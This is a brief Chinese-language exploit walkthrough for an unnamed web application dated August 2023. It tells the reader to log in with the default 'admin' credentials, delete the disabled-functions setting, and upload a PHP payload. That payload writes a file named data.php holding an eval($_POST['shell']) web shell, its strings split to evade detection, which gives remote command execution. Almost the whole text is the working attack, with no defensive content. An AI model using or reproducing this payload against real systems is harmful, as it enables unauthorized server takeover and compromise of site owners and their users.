1、使用默认帐号密码admin登入后台，目前最新版本（2023年8月15日）：

2、将系统禁用函数删除：

3、文件上传处上传payload：
```php
<?php
$fp=fopen('data.php','w');
fwrite($fp,'<?php ');
fwrite($fp,'eva');
fwrite($fp,'l($_PO');
fwrite($fp,'ST[');
fwrite($fp,'shell])?>');
fclose($fp);
echo 'ok';
?>
```

4、访问payload

5、目录下会生成木马文件，访问可执行命令


